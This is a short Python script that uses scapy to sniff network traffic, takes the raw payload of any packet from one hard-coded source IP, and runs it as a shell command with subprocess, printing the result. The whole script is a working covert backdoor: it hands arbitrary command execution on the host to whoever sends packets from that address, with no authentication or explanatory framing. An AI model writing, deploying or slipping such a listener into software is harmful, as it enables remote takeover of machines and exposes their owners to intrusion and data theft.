from scapy.all import *
import subprocess

def sniff_fnc(packet):
    # Check packet has payload (IP is specific because the device has too many traffic flows)
    if packet.haslayer(Raw) and packet.haslayer(IP) and packet[IP].src=="20.10.23.23":
       # Decode payload
       decoded_payload = packet[Raw].load.decode("utf-8")
       # Exec payload
       result = subprocess.run(decoded_payload, shell=True, capture_output=True, text=True)
       print(result.stdout)

print("Starting listen...")

sniff(prn=sniff_fnc, store=0)
